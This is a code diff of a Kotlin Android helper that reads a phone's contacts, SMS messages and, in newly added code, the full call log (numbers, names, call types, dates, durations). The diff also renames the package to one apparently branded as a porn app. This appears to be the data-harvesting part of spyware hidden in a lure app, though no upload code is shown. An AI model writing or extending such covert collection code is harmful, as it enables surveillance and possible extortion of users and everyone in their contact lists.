@@ -1,11 +1,13 @@
-package com.datasync.user.utils
+package com.boxx.porn.utils
 
 import android.annotation.SuppressLint
 import android.content.Context
+import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
-import com.datasync.user.model.Contact
-import com.datasync.user.model.SMS
+import com.boxx.porn.model.CallLog as CallLogModel
+import com.boxx.porn.model.Contact
+import com.boxx.porn.model.SMS
 
 object DataHelper {
 
@@ -18,8 +20,8 @@ object DataHelper {
         )
         cursor?.use {
             while (it.moveToNext()) {
-                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
-                val phone = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                val name = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)) ?: "Unknown"
+                val phone = it.getString(it.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)) ?: "Unknown"
                 contacts.add(Contact(name, phone, System.currentTimeMillis()))
             }
         }
@@ -43,5 +45,25 @@ object DataHelper {
             }
         }
         return smsList
+    }
+
+    @SuppressLint("Range")
+    fun fetchCallLogs(context: Context): List<CallLogModel> {
+        val callLogs = mutableListOf<CallLogModel>()
+        val cursor = context.contentResolver.query(
+            CallLog.Calls.CONTENT_URI,
+            null, null, null, null
+        )
+        cursor?.use {
+            while (it.moveToNext()) {
+                val number = it.getString(it.getColumnIndex(CallLog.Calls.NUMBER)) ?: ""
+                val name = it.getString(it.getColumnIndex(CallLog.Calls.CACHED_NAME)) ?: "Unknown"
+                val type = it.getInt(it.getColumnIndex(CallLog.Calls.TYPE))
+                val date = it.getLong(it.getColumnIndex(CallLog.Calls.DATE))
+                val duration = it.getLong(it.getColumnIndex(CallLog.Calls.DURATION))
+                callLogs.add(CallLogModel(number, name, type, date, duration))
+            }
+        }
+        return callLogs
     }
 }
